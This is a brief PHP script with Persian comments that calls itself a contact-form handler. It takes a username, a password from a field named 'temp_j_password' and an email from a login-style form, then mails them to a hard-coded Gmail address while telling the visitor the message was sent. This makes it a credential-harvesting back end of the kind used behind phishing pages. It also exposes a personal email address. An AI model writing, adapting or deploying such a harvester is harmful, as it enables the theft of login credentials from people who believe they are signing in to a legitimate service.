<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // دریافت اطلاعات از فرم
    $name = htmlspecialchars($_POST['j_username']); // جلوگیری از حملات XSS
    $passw = htmlspecialchars($_POST['temp_j_password']);
    $email = htmlspecialchars($_POST['j_email']);

    // مشخصات ایمیل
    $to = "mohammadaminbaranzhe59@gmail.com";  // ایمیل خودتان را وارد کنید
    $subject = "پیام جدید از فرم تماس";
    $body = "نام: " . $name . "\nایمیل: " . $email . "\nرمز عبور: " . $passw;

    // ارسال ایمیل
    if (mail($to, $subject, $body)) {
        echo "پیام شما با موفقیت ارسال شد!";
    } else {
        echo "ارسال پیام با خطا مواجه شد.";
    }
}
?>
